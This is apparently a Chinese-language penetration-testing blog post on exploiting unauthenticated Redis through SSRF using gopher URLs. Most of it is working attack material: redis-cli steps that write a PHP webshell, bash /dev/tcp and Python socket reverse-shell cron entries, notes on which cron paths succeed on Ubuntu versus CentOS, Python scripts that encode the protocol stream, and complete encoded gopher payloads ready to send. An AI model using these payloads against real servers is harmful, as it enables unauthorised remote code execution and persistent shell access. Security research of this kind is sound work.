Title: redis hacker
Date: 2017-12-5
slug: redis-hacker
Category: Pentest

Orange在BH大会的paper上面这么说的:

```
Protocols that are suitable to smuggle
  HTTP based protocol:
  	Elastic, CouchDB, Mongodb, Docker
  
  Text-based protocol:
    FTP, SMTP, Redis, Memcached
```

Ph在他<https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html>里面也提到过，redis的协议是简单的协议流，关于这一点可以查看redis的官方解释: <https://redis.io/topics/protocol>

<https://blog.chaitin.cn/gopher-attack-surfaces/>
在这篇文章里面提到使用gopher来攻击redis，使用的步骤是这样的：

* redis-server启动的时候监听6378端口 `redis-server /etc/redis/redis.conf --port 6378`
* 运行`socat -v tcp-listen:6379,fork tcp-connetc:localhost:6378`
* 然后再正常使用redis来攻击

##写shell

相当于把6379的端口流量转发到6378，而redis-server监听的是6378端口，使用redis-server来写shell是这样的步骤:

```
redis-cli -h 127.0.0.1 flushall
redis-cli -h 127.0.0.1 config set dir /var/www
redis-cli -h 127.0.0.1 config set dbfilename shell.php
redis-cli -h 127.0.0.1 set webshell "<?php phpinfo();?>"
redis-cli -h 127.0.0.1 save 
```
然后得到的数据流如下：

```
*1\r
$8\r
flushall\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$8\r
/var/www\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*3\r
$3\r
set\r
$3\r
web\r
$18\r
<?php phpinfo();?>\r
*1\r
$4\r
save\r
```

参考joychou写cron的脚本转换，python转换脚本如下:

```
f = open('/xxxxx/Desktop/3.txt', 'r')
s = ''
for line in f.readlines():
	# if line[-3:-1] == r"\r":
	# 	print line
	# print line[-3:-1]
	if line[-3:-1] == r"\r":
		line = line.replace(r"\r", "%0d%0a")
		line = line.replace("\n", '')
		s = s + line
print s.replace("$", "%24")


```

如上的写shell数据流经过编码如下(注意php的shell那里，经过上面转换还是尖括号，两个尖括号和`;`要经过url编码，然后使用curl直接发送如下，我也不知道为啥`$`还要编码，知道的同学请告知，谢谢）:

```
curl -v "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%248%0d%0a/var/www%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0aweb%0d%0a%2418%0d%0a%3C%3Fphp phpinfo()%3B%3F%3E%0d%0a*1%0d%0a%244%0d%0asave%0d%0a"
```

然后上面的payload在存在ssrf的时候，使用发送之前要url编码一次，发送即可得到shell。

```
gopher%3A%2F%2F127.0.0.1%3A6378%2F_*1%250d%250a%25248%250d%250aflushall%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250adir%250d%250a%25248%250d%250a%2Fvar%2Fwww%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%252410%250d%250adbfilename%250d%250a%25249%250d%250ashell.php%250d%250a*3%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250aweb%250d%250a%252418%250d%250a%253C%253Fphp%20phpinfo()%253B%253F%253E%250d%250a*1%250d%250a%25244%250d%250asave%250d%250a
```

###写定时任务

测试环境：
ubuntu  14.04.5 LTS
centos  6.7

直接crontab -e编辑:

```
*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1
```
在ubuntu下不会反弹成功，centos可以反弹成功。

改为Python反弹:

```
*/1 * * * * python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
ubuntu和Linux均反弹成功。

3. 编辑/etc/crontab，使用上面两个payload，注意［这里定时任务需要加user］

```
*/1 * * * * root  bash -i >& /dev/tcp/127.0.0.1/2333 0>&1
```

在ubuntu下，bash反弹失败，python反弹成功。
在CentOS下，两个均成功。

4. 编辑/var/spool/cron/root文件，使用上面两个反弹shell:

在Ubuntu下，两个均失败。
在CentOS下，两个均成功。

5. 编辑/var/spool/cron/crontabs/root(Centos默认没有这个路径），所以这个是ubuntu测试：

bash反弹失败
python反弹成功

Centos的定式任务在`/var/spool/cron/root`
Ubuntu定时任务`/var/spool/cron/crontabs/root`

所以如果redis里面写shell，<https://joychou.org/web/hackredis-enhanced-edition-script.html>，由于使用redis写crontab的时候，创建的文件权限是644，ubuntu无法执行，所以ubuntu下使用redis写shell是无法成功的。

写入/etc/crontab的时候，由于存在乱码，所以会导致ubuntu不能正确识别，导致定时任务失败。

所以以上两点来看，ubuntu利用写文件执行crontab不会成功：

* 如果写/etc/crontab，语法不识别
* 如果写`/var/spool/cron/crontabs/root`，权限不是root，语法不识别。

如果只能写文件，想反弹shell通用，比如redis的未授权访问（ubuntu这种情况下无解）：

1. 写/etc/crontab文件
2. 使用python反弹shell脚本

如果可以执行命令，想反弹shell，比如docker remote api未授权访问：

1. 写当前用户下crontab或者写`/etc/crontab`也可以。
2. 使用python反弹shell脚本


下面这个是从<https://joychou.org/web/phpssrf.html>这里搬来的代码，出来的结果，我这里发现需要对其中的`$`编码（另外说一句，这个`$`直接写在md之后，会改变文字的意思。貌似是个特殊字符。

```
#coding: utf-8
#author: JoyChou
import sys

exp = ''

with open('/Users/xxx/Desktop/1.txt') as f:
    for line in f.readlines():
        if line[0] in '><+':
            continue
        # 判断倒数第2、3字符串是否为\r
        elif line[-3:-1] == r'\r':
            # 如果该行只有\r，将\r替换成%0a%0d%0a
            if len(line) == 3:
                exp = exp + '%0a%0d%0a'
            else:
                line = line.replace(r'\r', '%0d%0a')
                # 去掉最后的换行符
                line = line.replace('\n', '')
                exp = exp + line
        # 判断是否是空行，空行替换为%0a
        elif line == '\x0a':
            exp = exp + '%0a'
        else:
            line = line.replace('\n', '')
            exp = exp + line
print exp.replace('$', '%24')
```
攻击的时候时候，使用的是这样的exp:

```
config set dir /var/spool/cron
config set dbfilename root
set www "\n\n*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\n\n"
save
```
经过编码之后，得到的exp:

```
gopher://127.0.0.1:6379/_*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2415%0d%0a/var/spool/cron%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%244%0d%0aroot%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0awww%0d%0a%2455%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1%0a%0a%0d%0a*1%0d%0a%244%0d%0asave%0d%0a
```

然后上面的再经过http编码即可攻击成功。



* https://www.hugeserver.com/kb/install-redis-centos/
* https://joychou.org/web/phpssrf.html
* https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html
* http://vinc.top/2016/11/24/%E3%80%90ssrf%E3%80%91ssrfgopher%E6%90%9E%E5%AE%9A%E5%86%85%E7%BD%91%E6%9C%AA%E6%8E%88%E6%9D%83redis/
* https://blog.chaitin.cn/gopher-attack-surfaces/